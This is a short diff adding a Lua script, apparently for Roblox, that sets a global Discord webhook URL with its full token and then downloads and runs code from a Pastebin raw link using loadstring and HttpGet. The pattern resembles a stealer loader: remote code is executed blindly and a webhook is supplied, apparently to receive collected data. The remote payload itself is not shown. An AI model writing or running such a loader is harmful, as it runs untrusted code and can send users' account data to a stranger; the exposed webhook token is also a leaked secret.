@@ -1,0 +1,3 @@
+_G.webhook = "https://discord.com/api/webhooks/1074895456980697088/7uKul4EqcsT6fGyR7BGMNfTQMjgN7HeDqPE_kAWAodvkYxuBCNWJYG1OgSKARTqcPH0V"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/JzVARHuq", true))()
